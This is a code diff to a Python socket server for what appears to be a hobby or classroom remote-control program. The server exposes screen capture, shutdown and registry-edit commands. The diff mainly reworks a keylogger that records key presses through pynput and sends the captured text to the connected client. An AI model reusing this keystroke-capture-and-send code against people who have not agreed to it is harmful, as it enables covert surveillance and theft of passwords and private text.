@@ -161,47 +161,68 @@ def take_picture(Client_socket):
 			break
 
 def keystroke(Client_socket):
+	print('do keystroke')
 	text = ''
+	unhook = True
 	def on_press(key):
+		nonlocal unhook
 		nonlocal text
-		text += str(key)
-		print(text)
+		if not unhook:
+			text += str(key)
+			print(text)
+		else:
+			text = ''
+
+	listener = keyboard.Listener(on_press = on_press, daemon = True)
+	listener.daemon = True
+	listener.start()
 
 	while True:
-		listener = keyboard.Listener(on_press = on_press, daemon = True)
 		Code = Client_socket.recv(1).decode("utf8")
 		if (Code == HOOK):
-			listener.start()
+			print('do hook')
+			if unhook:
+				unhook = False
+				text = ''
 		elif Code == UNHOOK:
-			listener.wait()
-			text = ''
+			print('do unhook')
+			if not unhook:
+				unhook = True
+				text = ''
 		elif Code == PRINT:
-			Client_socket.sendall(bytes(str(sys.getsizeof(text)),'utf8'))
+			print('do print')
+			l = len(text)
+			Client_socket.sendall(bytes(str(l),'utf8'))
 			Client_socket.recv(1)
-			Client_socket.sendall(bytes(text,'utf8'))
+			if l == 0:
+				Client_socket.sendall(bytes('0','utf8'))
+			else:
+				Client_socket.sendall(bytes(text,'utf8'))
 			Client_socket.recv(1)
+			text = ''
 		elif Code == QUIT:
-			listener.daemon = True
 			listener.stop()
-			raise sys.exit(0)
 			break
 
 
 def Shutdown_Computer():
-	os.system("C:\Windows\System32\shutdown /s /t 30")
+	print('shutdown')
+	# os.system("shutdown /s /t 30")
 
 def accept_incoming_connection():
 	while True:
 		try:
 			Client_socket, Client_add = Server.accept()
-			Z = threading.Thread(target=Run,args=(Client_socket,))
+			Z = threading.Thread(target=Run,args=(Client_socket,Client_add,))
 			Z.daemon = True # thread exit automatically when the main thread dies
 			Z.start()
 		except Exception as e:
+			print(e)
 			pass
 
 	
-def Run(Client_socket):
+def Run(Client_socket,Client_add):
+	print(str(Client_add) + ' has connected')
 	try:
 		# ket client
 		# Client_socket, Client_add = Server.accept()
@@ -219,6 +240,7 @@ def Run(Client_socket):
 				App(Client_socket)
 			#ShutDown
 			if (Code == SHUT_DOWN):
+				print('tat')
 				Shutdown_Computer()
 			#TAKEPIC
 			if (Code == SCREEN_CAPTURE):
@@ -226,18 +248,18 @@ def Run(Client_socket):
 			#KeyStock
 			if (Code == KEYSTROKE):
 				keystroke(Client_socket)
-				break
 			#Edit_Register
 			if (Code == EDIT_REGISTRY):
-				break
+				a = 1
 			#Exit
 			if (Code == EXIT):
+				Client_socket.close()
+				print(str(Client_add) + ' has disconnected')
 				break
-
 	except Exception as e:
 		print(e)
 		print("Close")
-		
+		Client_socket.close()
 
 def Run_Program(label1):
 	if label1.cget("text") == 'OFF':
